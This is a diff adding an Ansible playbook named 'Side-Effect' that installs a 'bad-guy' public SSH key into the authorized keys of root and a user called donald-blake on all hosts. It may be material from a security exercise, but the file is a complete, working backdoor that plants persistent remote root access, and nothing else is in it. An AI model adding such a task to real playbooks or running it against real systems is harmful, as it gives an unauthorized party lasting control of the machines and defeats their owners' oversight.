@@ -1,0 +1,17 @@
+---
+- name: Side-Effect
+  hosts: all
+  gather_facts: no
+  tasks:
+
+    - name: Add bad-guy ssh key to root
+      authorized_key:
+        user: "{{ item }}"
+        state: present
+        key: "{{ lookup('file', '../resources/public-keys/bad-guy.pub') }}"
+      become_user: "{{ item }}"
+      with_items:
+        - root
+        - donald-blake
+
+...
